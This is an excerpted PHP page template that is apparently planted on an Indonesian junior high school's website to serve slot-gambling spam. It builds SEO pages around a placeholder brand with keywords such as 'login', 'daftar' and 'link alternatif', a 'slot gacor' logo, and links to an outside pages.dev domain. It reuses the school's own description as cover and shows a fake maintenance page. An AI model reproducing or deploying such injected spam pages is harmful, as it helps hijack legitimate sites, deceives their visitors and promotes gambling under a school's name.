...
function feedback404()
{
    ...
    echo "<h1><strong>Website Sedang Dalam Pemeliharaan</strong></h1>";
...
$baseAuthor = $BRAND;
$URL  = "https://smpnegeri6depok.sch.id/?takterbatas=$BRAND";
$PAGEURL = "https://smpnegeri6depok.sch.id/?takterbatas=$BRAND";
$AMP = "https://smpnegeri6depok-718.pages.dev/author/?takterbatas=$BRAND";
$DAFTAR = "https://smpnegeri6depok-718.pages.dev/author/";
$BANNER = "https://res.cloudinary.com/dmxfczgyh/image/upload/v1750503442/banner-tunnel_u7jcaw.jpg";
$LOGO = "https://res.cloudinary.com/dmxfczgyh/image/upload/v1750411543/s lot_gacor_xtruuc.png";
$keyword = "$brand, login $brand, daftar $brand, situs $brand, rtp $brand, link alternatif $brand";

if ($NUMLIST >= 1 && $NUMLIST <= 31134) {
    $TITLE = "$BRAND 🚀 SMP NEGERI 6 DEPOK TERAKREDITASI A";
    $DESCRIPTION = "$BRAND merupakan sekolah menengah pertama negeri yang berlokasi di kota Depok, Jl. Mandor Samin No.62, Kecamatan Cilodong. SMP N 6 didirikan pada tahun 1994, dan menjadi sekolah menengah pertama yang mampu mencetak siswa berpretasi untuk masa depan Indonesia. Adapun ekstrakurikuler yang diberikan, dapat dijadikan acuan untuk menemukan bakat siswa dalam mencari jati siswa dan siswi SMP N 6 Depok.";
    $description = "$BRAND merupakan sekolah menengah pertama negeri yang berlokasi di kota Depok, Jl. Mandor Samin No.62, Kecamatan Cilodong. SMP N 6 didirikan pada tahun 1994, dan menjadi sekolah menengah pertama yang mampu mencetak siswa berpretasi untuk masa depan Indonesia. Adapun ekstrakurikuler yang diberikan, dapat dijadikan acuan untuk menemukan bakat siswa dalam mencari jati siswa dan siswi SMP N 6 Depok.";
}
                  ...
                  <div class="header-title-logo">
                    <a href="<?php echo $URL ?>" data-animation-role="header-element">
                      ...
                      <img elementtiming="nbf-header-logo-desktop"
                        src="https://res.cloudinary.com/dmxfczgyh/image/upload/v1750411543/slot_gacor_xtruuc.png"
